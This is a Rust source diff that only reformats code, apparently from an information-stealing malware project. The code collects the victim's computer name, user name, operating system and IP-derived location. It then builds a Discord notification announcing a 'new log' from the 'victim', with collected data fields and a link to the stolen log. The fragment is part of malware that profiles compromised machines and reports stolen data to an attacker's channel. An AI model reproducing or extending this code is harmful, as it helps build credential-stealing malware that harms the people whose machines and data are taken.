@@ -43,7 +43,11 @@ impl Display for DiscordEmbedFieldBlockDisplay<'_> {
         let mut body = String::new();
 
         for field in self.0.fields.iter() {
-            writeln!(body, "> {} {}: **{}**", field.emoji, field.name, field.value)?;
+            writeln!(
+                body,
+                "> {} {}: **{}**",
+                field.emoji, field.name, field.value
+            )?;
         }
 
         if body.ends_with('\n') {
@@ -71,9 +75,15 @@ where
     P: AsRef<str>,
     C: Collector,
 {
-    let PcInfo { computer_name, user_name, product_name } = PcInfo::retrieve();
+    let PcInfo {
+        computer_name,
+        user_name,
+        product_name,
+    } = PcInfo::retrieve();
     let IpInfo { country, city, .. } = unwrapped_ip_info();
-    let country_flag = internal_code_to_flag(&country).map(Arc::from).unwrap_or(country.clone());
+    let country_flag = internal_code_to_flag(&country)
+        .map(Arc::from)
+        .unwrap_or(country.clone());
 
     let link = match log {
         LogContent::ExternalLink(ExternalLink {
@@ -95,7 +105,7 @@ where
     let mut parts = vec![
         format!("✨ New log from {country_flag} **{city}**"),
         format!("Victim: **{computer_name}**/**{user_name}** on **{product_name}**"),
-        "".to_string()
+        "".to_string(),
     ];
     if let Some(l) = link {
         parts.push(l);
@@ -109,7 +119,8 @@ where
         parts.join("\n")
     };
 
-    let fields = collector.display_blocks()
+    let fields = collector
+        .display_blocks()
         .iter()
         .map(DiscordEmbedFieldBlockDisplay)
         .map(|x| x.to_string())
